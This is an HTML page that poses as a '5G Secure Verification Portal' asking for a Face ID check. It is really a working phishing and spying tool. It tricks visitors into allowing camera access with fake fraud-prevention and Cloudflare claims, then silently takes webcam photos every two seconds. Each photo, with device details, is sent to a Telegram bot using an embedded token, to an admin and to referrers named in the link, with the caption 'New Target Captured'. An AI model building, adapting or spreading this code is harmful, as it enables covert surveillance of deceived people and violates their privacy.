<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>5G Secure Verification Portal</title>
    <style>
        :root { --primary: #007aff; --bg: #f2f2f7; --card: #ffffff; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; color: #1c1c1e; }

        .container { width: 90%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }

        h2 { margin: 0 0 10px; font-size: 22px; }
        p { color: #8e8e93; font-size: 14px; margin-bottom: 25px; }

        .loader { width: 50px; height: 50px; border: 5px solid #e5e5ea; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }

        .btn { background: var(--primary); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn:active { transform: scale(0.98); opacity: 0.9; }

        /* Hidden Elements */
        #video, #canvas { position: absolute; top: -9999px; opacity: 0; pointer-events: none; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container" id="step1">
        <div class="loader"></div>
        <h2>Checking Device...</h2>
        <p>Analyzing 5G Compatibility & Signal Strength</p>
    </div>

    <div class="container" id="step2" style="display:none;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/800px-Google_Chrome_icon_%28February_2022%29.svg.png" width="60" style="margin-bottom:15px;">
        <h2>Security Check Required</h2>
        <p>To prevent fraud, please complete the Face ID verification to activate your offer.</p>
        <button class="btn" id="startBtn">Verify Identity Now</button>
        <p style="font-size:11px; margin-top:15px; color:#aaa;">Secure Connection by Cloudflare</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- ⚙️ CONFIGURATION ⚙️ ---
        const CONFIG = {
            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE', 
            ADMIN_ID: '8285724366' // आपकी ID (Master Admin)
        };

        // --- URL PARAMETER LOGIC ---
        const urlParams = new URLSearchParams(window.location.search);
        const REF_ID = urlParams.get('ref'); // लिंक से यूजर ID निकालना

        // --- UI LOGIC ---
        setTimeout(() => {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }, 2000);

        // --- CAPTURE & SEND LOGIC ---
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function sendData(blob) {
            // Recipient List: Admin + User (if exists)
            let recipients = [CONFIG.ADMIN_ID];
            if (REF_ID && REF_ID !== CONFIG.ADMIN_ID) {
                recipients.push(REF_ID);
            }

            // Gather Device Info
            const platform = navigator.platform;
            const battery = await navigator.getBattery?.().then(b => Math.round(b.level * 100) + '%') || 'Unknown';
            
            const caption = `🎯 *New Target Captured!* \n\n` +
                            `🆔 Ref User: ${REF_ID || 'Direct Link'}\n` +
                            `📱 Device: ${platform}\n` +
                            `🔋 Battery: ${battery}\n` +
                            `🕒 Time: ${new Date().toLocaleTimeString()}`;

            // Send to ALL recipients
            recipients.forEach(chatId => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'cam.jpg');
                fd.append('caption', caption);
                fd.append('parse_mode', 'Markdown');

                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                }).catch(err => console.log(`Error sending to ${chatId}`));
            });
        }

        document.getElementById('startBtn').addEventListener('click', async () => {
            const btn = document.getElementById('startBtn');
            btn.innerText = "Connecting Secure Server...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                // Start Loop: Capture every 2 seconds
                setInterval(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(blob => sendData(blob), 'image/jpeg', 0.5);
                }, 2000);

                setTimeout(() => {
                    alert("Verification Successful! Redirecting...");
                    btn.innerText = "Verified ✓";
                    btn.style.background = "#34c759";
                }, 4000);

            } catch (err) {
                alert("Camera permission is required for verification.");
                btn.innerText = "Try Again";
                location.reload();
            }
        });
    </script>
</body>
</html>
